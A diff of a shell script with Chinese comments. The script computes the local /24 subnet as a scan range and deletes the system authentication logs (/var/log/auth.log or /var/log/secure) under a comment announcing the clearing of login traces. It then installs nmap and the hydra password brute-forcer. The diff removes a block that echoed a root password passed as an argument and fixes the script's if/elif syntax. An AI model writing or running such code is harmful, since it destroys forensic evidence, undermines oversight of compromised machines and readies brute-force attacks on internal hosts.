@@ -11,13 +11,9 @@ echo 内网子网掩码为：$local_netmask
 ip_range=${local_ip%.*}.0/24
 echo 扫描范围：$ip_range
 
-# 读取本机的root账号密码
-local_pass=$1
-echo $local_pass
-
 # 检测linux版本，根据不同版本下载不同的源
 id=$(awk -F= '$1=="ID" { print $2 ;}' /etc/os-release)
-if [ $id = "ubuntu" ] || [ $id = "kali" ] || [ $id = "debian" ] ;then
+if [ $id = "ubuntu" ] ;then
 echo 本机为$id
 echo 清理登录痕迹
 sudo rm /var/log/auth.log
@@ -31,10 +27,9 @@ sudo apt update &&sudo apt install nmap hydra -y
 
 sudo mv /etc/apt/sources.list.bak /etc/apt/sources.list
 echo 源文件已恢复
-fi
 
 # 适配centos
-elif [ $id = "\"centos\"" ]   ] ;then
+elif [ $id = "\"centos\"" ] ;then
 echo 本机为$id
 echo 清理登录痕迹
 sudo rm /var/log/secure
